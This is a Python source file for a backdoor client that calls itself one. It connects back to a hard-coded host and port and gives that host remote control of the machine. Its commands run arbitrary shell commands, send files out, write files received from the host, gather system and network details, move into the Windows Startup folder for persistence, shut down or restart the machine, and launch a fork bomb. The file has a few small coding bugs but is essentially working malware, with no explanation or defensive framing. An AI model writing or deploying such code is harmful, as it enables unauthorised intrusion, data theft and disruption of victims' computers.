import socket
import subprocess
import os
import platform
import getpass
from time import sleep
import threading

RHOST = "192.168.1.104"
RPORT = 2121

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        sock.connect((RHOST, RPORT))
        break

    except Exception:
        continue

while True:
    try:
        header = f"""\n{getpass.getuser()}@{platform.node()}: {os.getcwd()}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())
            continue

        # fork bomb
        elif cmd == "forkbomb":
            while True:
                subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

        # get current path
        elif cmd == "path":
            path = os.getcwd()
            sock.send("Current path: {}".format(path).encode())
            continue

        # rename files
        elif cmd.split(" ")[0] == "rename":
            os.rename(cmd.split(" ")[1], cmd.split(" ")[2])
            sock.send("File has been successfully renamed to '{}'".format(str(cmd.split(" ")[2])).encode())
            continue

        # create files
        elif cmd.split(" ")[0] == "create":
            file = open(cmd.split(" ")[1], "w+")
            file.close()

            sock.send("File '{}' has been successfully created.".format(cmd.split(" ")[1]).encode())
            continue

        # get connection information
        elif cmd == "inet":
            hostname = socket.gethostname()

            sysinfo = f"""
IpAdress: {socket.gethostbyname(hostname)}
Current Backdoor Host: {RHOST}
Current Backdoor Port: {RPORT}
Adress Information: {socket.getaddrinfo(RHOST, RPORT)}
            """
            sock.send(sysinfo.encode())

        # shutdown or restart
        elif cmd.split(" ")[0] == "target":

            if cmd.split(" ")[1] == "-stop":
                os.system("shutdown /s")
                sock.send("The client will shutdown now".encode())
                continue

            elif cmd.split(" ")[1] == "-restart":
                os.system("shutdown /r")
                sock.send("The client will restart now".encode())
                continue

            else:
                sock.send("Wrong input, just use 'target -stop' | 'target -restart'".encode())
                continue

        # moving to autostart folder
        elif cmd == "autostart":
            os.chdir("C:/Users/" + os.getlogin() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
            sock.send("Changed directory to {}".format(os.getcwd()).encode())
            continue

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split("*")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())
            continue

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())
            continue

        # Download files
        elif cmd.split(" ")[0] == "download":

            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)

                while file_data:
                    sock.send(file_data)
                    file_data = f.read(1024)

                sleep(2)
                sock.send(b"DONE")

        # upload files
        elif cmd.split(" ")[0] == "upload":
            file_name = cmd.split(" ")[1][::-1]

            with open(file_name, "wb") as f:
                read_data = sock.recv(1024)

                while read_data:
                    f.write(read_data)
                    read_data = sock.recv(1024)

                    if read_data == b"DONE":
                        break

                    else:
                        continue

                sock.send("Upload successfully completed".encode())
                continue

        # exit the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # terminate client and server
        elif cmd == "terminate":
            sock.send(b"terminate")
            sock.close()
            os._exit(1)

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()

            if not STDOUT:
                sock.send(STDERR)
                continue
            else:
                sock.send(STDOUT)
                continue

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break

    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())

sock.close()
